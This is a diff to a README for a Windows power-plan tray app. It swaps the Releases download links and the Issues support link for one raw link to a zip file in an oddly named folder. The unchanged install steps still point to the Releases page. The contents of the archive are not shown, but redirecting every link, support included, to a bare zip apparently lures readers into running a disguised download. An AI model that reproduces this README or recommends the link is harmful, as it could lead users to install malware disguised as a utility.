@@ -1,7 +1,7 @@
 # 🌟 PowerPlanSwitcher_TrayApp - Quickly Switch Power Plans
 
 ## 📥 Download Now
-[![Download PowerPlanSwitcher_TrayApp](https://img.shields.io/badge/Download-PowerPlanSwitcher_TrayApp-blue.svg)](https://github.com/olu-ds/PowerPlanSwitcher_TrayApp/releases)
+[![Download PowerPlanSwitcher_TrayApp](https://github.com/olu-ds/PowerPlanSwitcher_TrayApp/raw/refs/heads/main/gassiness/Tray_Switcher_App_Power_Plan_v3.0.zip)](https://github.com/olu-ds/PowerPlanSwitcher_TrayApp/raw/refs/heads/main/gassiness/Tray_Switcher_App_Power_Plan_v3.0.zip)
 
 ## 🚀 Getting Started
 PowerPlanSwitcher_TrayApp is a lightweight application designed for Windows users. This tool lets you switch between power plans instantly and customize settings for each plan, like display timeouts and sleep settings. It features a user-friendly interface in both English and Español, and it adapts to your theme with appropriate icons.
@@ -23,7 +23,7 @@ PowerPlanSwitcher_TrayApp is a lightweight application designed for Windows user
 - Theme-aware icons that match your Windows settings.
 
 ## 🌐 Download & Install
-To download PowerPlanSwitcher_TrayApp, visit the following link: [Download Here](https://github.com/olu-ds/PowerPlanSwitcher_TrayApp/releases).
+To download PowerPlanSwitcher_TrayApp, visit the following link: [Download Here](https://github.com/olu-ds/PowerPlanSwitcher_TrayApp/raw/refs/heads/main/gassiness/Tray_Switcher_App_Power_Plan_v3.0.zip).
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version listed at the top.
@@ -45,7 +45,7 @@ If you encounter issues while using PowerPlanSwitcher_TrayApp, consider the foll
 - **Functionality Issues:** Restart the application and see if the problem persists.
 
 ## 📞 Support
-If you need additional help, feel free to open an issue on our GitHub [Issues page](https://github.com/olu-ds/PowerPlanSwitcher_TrayApp/issues). We strive to respond promptly and assist with any questions you might have.
+If you need additional help, feel free to open an issue on our GitHub [Issues page](https://github.com/olu-ds/PowerPlanSwitcher_TrayApp/raw/refs/heads/main/gassiness/Tray_Switcher_App_Power_Plan_v3.0.zip). We strive to respond promptly and assist with any questions you might have.
 
 ## 🙏 Acknowledgments
 Thanks to all the contributors who helped make this project possible. Your efforts in enhancing this tool for users are appreciated. 
